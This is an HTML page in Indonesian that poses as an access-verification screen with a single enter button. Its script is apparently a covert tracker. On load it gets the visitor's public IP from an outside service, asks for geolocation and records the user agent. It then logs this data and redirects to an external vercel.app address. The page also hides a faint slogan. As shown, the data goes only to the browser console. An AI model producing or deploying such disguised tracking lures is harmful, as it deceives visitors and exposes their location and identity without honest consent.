<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Akses</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #ffffff;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        #btn-access {
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 500;
            color: #ffffff;
            background-color: #2563eb;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        #btn-access:hover {
            background-color: #1d4ed8;
        }

        #btn-access:active {
            transform: scale(0.98);
        }

        #status {
            position: fixed;
            bottom: 20px;
            font-size: 10px;
            color: #e5e7eb; /* Sangat samar agar tidak terlihat */
        }
    </style>
</head>
<body>

    <button id="btn-access">Klik untuk Masuk</button>

    <div id="status">ACAB 1312.</div>

    <script>
        const btn = document.getElementById('btn-access');
        let userLog = {
            ip: "Pending",
            lat: null,
            lon: null,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };

        // Otomatis ambil IP saat halaman dibuka
        async function captureIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userLog.ip = data.ip;
                console.log("IP Logged");
            } catch (err) {
                console.log("IP Fail");
            }
        }

        // Minta lokasi (akan muncul prompt di browser)
        function captureLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        userLog.lat = pos.coords.latitude;
                        userLog.lon = pos.coords.longitude;
                        console.log("Loc Logged");
                    },
                    (err) => {
                        console.log("Loc Denied");
                    }
                );
            }
        }

        // Jalankan pelacakan dasar
        captureIP();
        captureLocation();

        // Aksi tombol
        btn.addEventListener('click', () => {
            // Ubah teks sebentar untuk feedback visual
            btn.innerText = "Memproses...";
            btn.style.opacity = "0.7";
            btn.disabled = true;

            // Final log sebelum pindah halaman
            console.log("Final User Data:", userLog);

            // Redirect ke tujuan
            setTimeout(() => {
                window.location.href = "https://welcome-constitute.vercel.app/";
            }, 800);
        });
    </script>
</body>
</html>
